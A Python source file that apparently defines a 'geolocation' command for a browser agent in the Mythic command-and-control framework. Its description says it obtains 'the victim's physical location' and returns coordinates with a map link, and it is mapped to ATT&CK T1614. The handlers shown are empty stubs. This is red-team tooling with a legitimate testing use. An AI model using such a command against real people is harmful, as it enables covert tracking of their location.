from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class GeolocationArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class GeolocationCommand(CommandBase):
    cmd = "geolocation"
    needs_admin = False
    help_cmd = "geolocation"
    description = "Get the victim's physical location via the Geolocation API. May trigger a browser permission prompt. Returns coordinates with Google Maps link."
    version = 1
    author = "@grampae"
    attackmapping = ["T1614"]
    argument_class = GeolocationArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
